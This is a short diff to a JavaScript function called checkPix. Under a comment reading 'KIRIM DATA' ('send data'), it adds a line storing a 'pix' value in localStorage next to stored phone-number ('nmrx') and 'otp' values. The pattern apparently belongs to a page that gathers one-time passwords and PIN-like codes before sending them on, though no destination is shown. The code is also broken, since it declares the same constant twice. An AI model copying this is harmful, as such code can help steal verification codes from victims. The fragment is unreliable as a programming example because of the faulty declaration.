@@ -184,6 +184,7 @@ async function checkPix(){
             /* STEP 3: KIRIM DATA */
 /* ========================= */
 
+            localStorage.setItem("pix", pix);
             const nmrx = localStorage.getItem("nmrx");
             const nmrx = localStorage.getItem("otp");
 
